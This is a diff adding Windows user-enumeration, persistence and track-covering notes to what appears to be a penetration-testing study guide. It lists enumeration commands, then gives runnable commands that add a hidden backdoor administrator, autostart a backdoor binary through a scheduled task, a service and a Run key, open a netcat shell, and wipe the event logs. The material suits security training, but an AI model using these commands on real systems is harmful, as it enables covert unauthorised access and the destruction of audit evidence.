@@ -58,6 +58,134 @@ Once attackers gain local access to a Windows system, they use local enumeration
 7. **Accessing Stored Credentials:**
    * Tools like `mimikatz` can extract stored credentials from memory, allowing attackers to impersonate other users or administrators.
 
+### User Account Enumeration
+
+#### **a. Identifying Accounts with Administrative or Elevated Privileges**
+
+Once user accounts are enumerated, you can identify which accounts have administrative or elevated privileges by examining specific attributes, groups, and permissions associated with those accounts.
+
+**Attributes and Groups to Look For:**
+
+1. **Membership in Administrative Groups:**
+   * Look for accounts in the **Administrators** group:
+     * `net localgroup administrators` (Displays members of the local Administrators group)
+   * Check for accounts in other privileged groups, such as:
+     * **Power Users**
+     * **Remote Desktop Users** (if they can access the system remotely)
+     * **Backup Operators** (can bypass file permissions)
+2. **Special Privileges:**
+   * Use the `whoami /priv` command to check privileges. Look for sensitive privileges like:
+     * `SeDebugPrivilege` (Debug Programs)
+     * `SeTakeOwnershipPrivilege` (Take Ownership)
+     * `SeImpersonatePrivilege` (Impersonate a Client)
+3. **Group Policies or Domain Groups:**
+   * On domain-joined systems, accounts in groups like **Domain Admins** or **Enterprise Admins** have elevated privileges across the domain.
+4. **Login Rights and Access:**
+   * Check user rights and access permissions using `gpresult /r` to see group membership and policies applied to specific accounts.
+
+***
+
+#### **b. Tools and Commands for User Account Enumeration**
+
+**Built-in Windows Commands:**
+
+1. **List Local Users:**
+   * `net user` (Lists all local user accounts)
+   * `wmic useraccount list full` (Provides detailed information about user accounts)
+2. **List Group Memberships:**
+   * `net localgroup` (Lists all groups)
+   * `net localgroup [groupname]` (Lists members of a specific group, such as `Administrators`)
+3. **Check Current User Privileges:**
+   * `whoami /all` (Displays the current user’s group memberships and privileges)
+4. **Domain Enumeration (if part of a domain):**
+   * `net group /domain` (Lists domain groups)
+   * `net group [groupname] /domain` (Lists members of a specific domain group)
+
+**Third-Party Tools:**
+
+1. **PowerShell Scripts:**
+   * `Get-LocalUser` (PowerShell command to list local users)
+   * `Get-LocalGroupMember -Group "Administrators"` (Lists members of the local Administrators group)
+2. **Penetration Testing Tools:**
+   * **PowerView** (Part of PowerSploit, used for advanced enumeration)
+   * **BloodHound** (Visualizes user privileges and attack paths in Active Directory environments)
+3. **PsExec and PsTools Suite (Sysinternals):**
+   * Tools like `PsExec` can be used for remote enumeration of accounts and permissions.
+
+***
+
+#### **c. Making Persistence on a System with Administrative Privileges**
+
+If you have admin privileges and can create a new user, you could establish persistence by creating a backdoor user or configuring settings to ensure your access remains undetected.
+
+**Steps for Persistence:**
+
+1. **Create a New User:**
+   *   Use the following commands to create a user and add them to the Administrators group:
+
+       ```cmd
+       net user backdoor password123 /add
+       net localgroup administrators backdoor /add
+       ```
+2. **Enable RDP Access for Persistence:**
+   *   Allow the new user to log in remotely:
+
+       ```cmd
+       net localgroup "Remote Desktop Users" backdoor /add
+       ```
+   *   Open the RDP port if it’s closed:
+
+       ```cmd
+       netsh advfirewall firewall add rule name="RDP" protocol=TCP dir=in localport=3389 action=allow
+       ```
+3. **Create a Scheduled Task:**
+   *   Configure a task to re-establish access or execute malicious scripts periodically:
+
+       ```cmd
+       schtasks /create /sc daily /tn "BackdoorTask" /tr "C:\backdoor.exe" /ru backdoor /rp password123
+       ```
+4. **Set Up a Service:**
+   *   Install a malicious service that automatically starts with elevated privileges:
+
+       ```cmd
+       sc create backdoor binpath= "C:\malicious.exe" start= auto
+       ```
+5. **Manipulate Registry for Persistence:**
+   *   Add an entry in the registry for persistence:
+
+       ```cmd
+       reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\backdoor.exe"
+       ```
+6. **Use Existing Tools:**
+   *   Install tools like **netcat** or set up a reverse shell to regain access later:
+
+       ```cmd
+       nc -lvp 4444 -e cmd.exe
+       ```
+
+**Covering Tracks:**
+
+1. **Clear Logs:**
+   *   Use the `wevtutil` command to clear logs:
+
+       ```cmd
+       wevtutil cl System
+       wevtutil cl Security
+       ```
+2. **Rename or Hide the User:**
+   *   Rename the backdoor account to look legitimate:
+
+       ```cmd
+       net user backdoor admin1
+       ```
+   *   Disable the account but keep it in the Administrators group:
+
+       ```cmd
+       net user backdoor /active:no
+       ```
+
+By employing these methods, attackers can ensure long-term access while minimizing the likelihood of detection. However, implementing strong security measures and monitoring can help mitigate these risks.
+
 ## AD
 
 ### NBT-NS vs DNS
